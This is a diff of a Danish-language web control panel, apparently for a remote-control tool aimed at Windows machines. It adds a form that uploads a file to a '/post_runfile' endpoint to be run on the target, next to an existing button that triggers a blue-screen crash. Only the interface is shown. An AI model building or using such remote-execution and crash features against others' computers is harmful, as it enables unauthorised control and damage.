@@ -52,6 +52,13 @@
             <label class="label">Virker kun på windows!</label>
             <br><br>
             <button class="sendButton" style="background-color: blue;" onclick="sendBSOD()">Start BSOD!</button>
+            <h3 class="title">Kør fil</h3>
+            <label class="label">Virker kun på windows!</label>
+            <form enctype="multipart/form-data" id="fileForm">
+                <input type="file" id="file" name="file">
+                <br><br>
+                <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
+            </form>
         </div>
 
         <script>
@@ -66,6 +73,27 @@
                     .then(response => {
                         if (response.status == 200) {
                             alert("Billede sendt!");
+                        } else if (response.status == 403) {
+                            alert("Forkert key!");
+                        } else {
+                            alert("Ukendt fejl!")
+                        }
+                    });
+
+                event.preventDefault();
+            }
+
+            const form = document.getElementById("fileForm");
+            form.onsubmit = function (event) {
+                const form = event.currentTarget;
+                const formData = new FormData(form);
+
+                key = document.getElementById("key").value;
+
+                fetch(`${document.URL}/post_runfile?key=${key}`, { "method": "POST", "body": formData })
+                    .then(response => {
+                        if (response.status == 200) {
+                            alert("Fil sendt!");
                         } else if (response.status == 403) {
                             alert("Forkert key!");
                         } else {
